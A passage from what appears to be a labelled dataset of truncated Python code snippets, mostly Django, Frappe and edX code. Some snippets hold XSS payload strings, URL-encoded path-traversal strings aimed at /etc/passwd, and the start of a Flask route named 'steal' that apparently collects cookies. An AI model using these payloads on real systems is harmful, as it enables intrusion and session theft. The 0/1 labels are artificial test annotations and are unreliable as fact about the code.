listen_port(self): \"\"\" The port the IdP authentication should", "label": 0}, {"snippet_id": 48920, "code": ".column.render_function(self.object) field=getattr(self.object, self.column.field_name) if self.column.field_name else None if type(self.object)==dict: value=self.object.get(self.column.field_name) elif", "label": 1}, {"snippet_id": 22996, "code": "]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name", "label": 0}, {"snippet_id": 54825, "code": "'is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def test_func(self): return self.request.user==self.get_object().author class ArticleDelete(UserPassesTestMixin, DeleteView): \"", "label": 0}, {"snippet_id": 48983, "code": ": return format_html( '<td>{}</td>', self.format(self.get_value()) ) def render_link(self): if not hasattr(self.object, 'get_absolute_url'): raise SmartListException(\"Please make sure your model{} implements", "label": 0}, {"snippet_id": 12442, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 6402, "code": " one of cherrypy.wsgiserver.ssl_adapters) \"\"\" return self.config.get(self.section, 'ssl_adapter') @property def server_cert(self): \"\"\" SSL certificate filename(None==SSL disabled) \"\"\" return self.config", "label": 0}, {"snippet_id": 36333, "code": ".print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self", "label": 0}, {"snippet_id": 12907, "code": "('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get(", "label": 0}, {"snippet_id": 4513, "code": " \"\u03b1\", cnt) s=s.replace(\"e\", \"\u0435\", cnt) s=s.replace(\"a\", \"\u0430\", cnt) s=s.replace(\"e\", \"\u0451\", cnt) s=s.replace(\"o\", \"\u043e\", cnt) return s @staticmethod def fuzzErrorUnicode(s): return s +chr(random.randint(0xC2,", "label": 0}, {"snippet_id": 47369, "code": "=None if http_request.GET.get(\"user_id\"): user_id=int(http_request.GET[\"user_id\"]) if user_id is not None: profile=Profile.objects.get(pk=user_id) f=Form() f.action_url=action_url if profile: f.add_content", "label": 0}, {"snippet_id": 45545, "code": "): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid", "label": 0}, {"snippet_id": 47318, "code": " django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest from django.shortcuts import redirect from django.contrib.auth.models import User from. import page_skeleton, magic from.form", "label": 0}, {"snippet_id": 41724, "code": "\t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")", "label": 0}, {"snippet_id": 28681, "code": ") \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE", "label": 0}, {"snippet_id": 4509, "code": " s=s.replace(\"A\", \"\u0104\", cnt) s=s.replace(\"a\", \"\u03b1\", cnt) s=s.replace(\"e\", \"\u0435\", cnt) s=s.replace(\"a\", \"\u0430\", cnt) s=s.replace(\"e\", \"\u0451\", cnt) s=s.replace(\"o\", \"\u043e\", cnt) return s @staticmethod def fuzzErrorUnicode", "label": 0}, {"snippet_id": 47900, "code": "[\"username\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes\"]) pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail", "label": 0}, {"snippet_id": 14619, "code": "-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file", "label": 0}, {"snippet_id": 52632, "code": " in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']", "label": 0}, {"snippet_id": 6072, "code": "'content_packages':[], 'verify_request_signatures': '0', 'status_test_usernames':[], 'signup_link': ' 'dashboard_link': ' 'password_reset_link': ' 'default_language': 'en', 'base_url': None, 'default_eppn_scope'", "label": 1}, {"snippet_id": 51413, "code": " import os from datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path.dirname(__file__", "label": 0}, {"snippet_id": 36327, "code": "\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t", "label": 0}, {"snippet_id": 20890, "code": "'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 49587, "code": ".query_params=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or[] self.list_search=list_search or[] self.search_query_value=self.query_params.get(search_query_param, ''", "label": 0}, {"snippet_id": 25590, "code": " or orderpos item=pos.item questions=pos.item.questions_to_ask event=kwargs.pop('event') super().__init__(*args, **kwargs) if item.admission and event.settings.attendee_names_asked: self.fields['attendee_name_parts", "label": 0}, {"snippet_id": 28236, "code": "=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import", "label": 0}, {"snippet_id": 10220, "code": ") self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def", "label": 1}, {"snippet_id": 8828, "code": " name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static", "label": 0}, {"snippet_id": 26152, "code": "(self.instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional", "label": 0}, {"snippet_id": 35917, "code": " string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript", "label": 0}, {"snippet_id": 11739, "code": "\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^", "label": 0}, {"snippet_id": 47475, "code": ") if current_user.rights > 3: if not profile: f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED)) else: m: CheckEnum=CheckEnum.CHECKED if not profile.active: m=CheckEnum", "label": 0}, {"snippet_id": 53375, "code": " Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else", "label": 1}, {"snippet_id": 15927, "code": ", self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test", "label": 0}, {"snippet_id": 27930, "code": "*kwargs) class GcsUploadHandler(Handler): \"\"\"A handler which uploads files to GCS.\"\"\" def __init__(self, request, response): self.initialize(request, response) self.upload=None def get_upload(self): \"\"", "label": 1}, {"snippet_id": 16551, "code": "*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch", "label": 0}, {"snippet_id": 17274, "code": "+=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url", "label": 0}, {"snippet_id": 2753, "code": ", '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url==", "label": 0}, {"snippet_id": 10408, "code": "(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises", "label": 0}, {"snippet_id": 16998, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 48061, "code": "+str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) low_res_file_name=upload_base_path +'/LOWRES_' +ntpath.basename(file.name.replace(\"", "label": 0}, {"snippet_id": 30420, "code": ") \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \tgrep_act ='|grep' \telse: \t\tgrep_act='", "label": 0}, {"snippet_id": 25461, "code": " for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields", "label": 0}, {"snippet_id": 13904, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary", "label": 0}, {"snippet_id": 24071, "code": "(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in", "label": 0}, {"snippet_id": 27051, "code": " j in range(0, len(params)): if j==i: post_params[params[j]]=lfi else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len", "label": 0}, {"snippet_id": 24267, "code": " import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color", "label": 0}, {"snippet_id": 29225, "code": " line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs): \terror=\"\" \tfull_path=path +file \tif kwargs.get('dir')==\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept", "label": 0}, {"snippet_id": 34290, "code": " d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d):", "label": 0}, {"snippet_id": 22143, "code": ") urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard", "label": 0}, {"snippet_id": 32307, "code": "':%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory", "label": 0}, {"snippet_id": 50812, "code": "\"screenreader\", flags.get(\"SCREENREADER\", False)) prompt=options.get(\"send_prompt\", False) if screenreader: text=parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False) text=_RE_SCREENREADER_REGEX", "label": 0}, {"snippet_id": 24692, "code": ".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming", "label": 0}, {"snippet_id": 48693, "code": ") return response def action_delete_article(request: HttpRequest): \"\"\" This function removes an article from the reservation and returnes the required resonse. \"\"\" u: Profile=get_current_user(request) if", "label": 0}, {"snippet_id": 11252, "code": "(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler", "label": 0}, {"snippet_id": 8899, "code": "(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=(", "label": 0}, {"snippet_id": 1992, "code": "+payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print", "label": 0}, {"snippet_id": 53353, "code": "=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2", "label": 0}, {"snippet_id": 108, "code": " True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s", "label": 1}, {"snippet_id": 4596, "code": " 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map", "label": 0}, {"snippet_id": 37267, "code": " self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif", "label": 0}, {"snippet_id": 3024, "code": ",method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 30628, "code": ".getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t", "label": 0}, {"snippet_id": 45743, "code": "=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' %", "label": 0}, {"snippet_id": 49889, "code": " bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit at:{{ beemit_address}}\", ] return render_template(", "label": 1}, {"snippet_id": 15881, "code": "(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all", "label": 0}, {"snippet_id": 15939, "code": "() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file", "label": 0}, {"snippet_id": 17364, "code": ": urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name", "label": 0}, {"snippet_id": 6559, "code": " \"\"\" Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some/path/, pkg2:foo :return: list of(pkg, path) tuples", "label": 0}, {"snippet_id": 17575, "code": " from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$", "label": 0}, {"snippet_id": 10711, "code": " than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"", "label": 0}, {"snippet_id": 11672, "code": "(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 45462, "code": " mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy() properties=", "label": 0}, {"snippet_id": 20051, "code": " bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. ", "label": 0}, {"snippet_id": 54401, "code": ") refresh.config(width=30) crawl.grid(row=8, column=1) crawl.current(0) crawl.config(width=30) Button(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4) Button(main, text", "label": 0}, {"snippet_id": 26298, "code": " country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError, ValueError): raise ValidationError(_('This VAT", "label": 0}, {"snippet_id": 17927, "code": "'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9", "label": 0}, {"snippet_id": 19967, "code": " msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green", "label": 0}, {"snippet_id": 331, "code": ",scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss", "label": 0}, {"snippet_id": 31563, "code": " \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df.index", "label": 0}, {"snippet_id": 31199, "code": " Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('table_metrics.html') \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) ", "label": 0}, {"snippet_id": 28286, "code": ") \t \t \t \t \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir +\"*.old\") template=template.render(h2=1, title=\"Working with HAProxy configs\", \t\t\t\t\t\t\trole=role, \t\t\t\t\t\t\taction=\"config.py\", \t\t\t\t\t\t\tuser=user, \t\t", "label": 0}, {"snippet_id": 40665, "code": ".print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname):", "label": 0}, {"snippet_id": 53594, "code": ", mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in", "label": 0}, {"snippet_id": 3553, "code": "=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url)", "label": 0}, {"snippet_id": 51401, "code": " the full list of settings and their values, see https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR", "label": 0}, {"snippet_id": 997, "code": " def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query", "label": 0}, {"snippet_id": 32414, "code": " to URL anchor name. This function is passed to \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about", "label": 0}, {"snippet_id": 43058, "code": ".get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join", "label": 0}, {"snippet_id": 25601, "code": " item.admission and event.settings.attendee_names_asked: self.fields['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required, scheme=event.settings.name_scheme", "label": 0}, {"snippet_id": 46066, "code": ", e: raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\")) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.method=='GET': if 'q' in request", "label": 0}, {"snippet_id": 14990, "code": " TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self):", "label": 0}, {"snippet_id": 42336, "code": " no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", ", "label": 0}, {"snippet_id": 35748, "code": "] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint", "label": 0}, {"snippet_id": 7038, "code": "=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name", "label": 0}, {"snippet_id": 38525, "code": " \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\",", "label": 0}, {"snippet_id": 23075, "code": ">[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$", "label": 0}, {"snippet_id": 8055, "code": " name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', ", "label": 0}, {"snippet_id": 7400, "code": "'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 25087, "code": ".imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir)", "label": 0}, {"snippet_id": 43737, "code": " __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\")", "label": 0}, {"snippet_id": 5509, "code": " content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>'", "label": 0}, {"snippet_id": 33789, "code": "(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=", "label": 1}, {"snippet_id": 18156, "code": " name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',", "label": 0}, {"snippet_id": 32050, "code": "\"Create Mapping\") url=\"horizon:identity:mappings:create\" classes=(\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\", \"identity:create_mapping\"),) class EditMappingLink(tables.LinkAction): name=\"edit", "label": 0}, {"snippet_id": 3006, "code": "\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 53965, "code": "'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\"", "label": 0}, {"snippet_id": 3870, "code": " host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find", "label": 0}, {"snippet_id": 14849, "code": "=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 47170, "code": " from flask_admin import Admin, menu from mock import patch from sqlalchemy.exc import SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin", "label": 0}, {"snippet_id": 45657, "code": ".name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data", "label": 0}, {"snippet_id": 12162, "code": "*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 1}, {"snippet_id": 15841, "code": ".should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self", "label": 0}, {"snippet_id": 54983, "code": " in existing: changed_entities_array.append( ChangedEntityLocale(entity=changed_entity, locale=locale) ) ChangedEntityLocale.objects.bulk_create(changed_entities_array) def update_translation_memory(changed_translation_pks", "label": 0}, {"snippet_id": 15195, "code": " directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set", "label": 0}, {"snippet_id": 41029, "code": " posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): ", "label": 0}, {"snippet_id": 8323, "code": ".migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'),", "label": 0}, {"snippet_id": 19961, "code": "() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services(", "label": 0}, {"snippet_id": 26650, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '../../boot.ini', '../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../..", "label": 0}, {"snippet_id": 29713, "code": " stderr=subprocess_execute(cmd) \tret=\"\" \tfor line in output: \t\tif \" \t\t\tcontinue \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t", "label": 0}, {"snippet_id": 41415, "code": ".published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication`", "label": 0}, {"snippet_id": 35165, "code": " timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"):", "label": 0}, {"snippet_id": 14627, "code": "\" ).format( default_store=store, 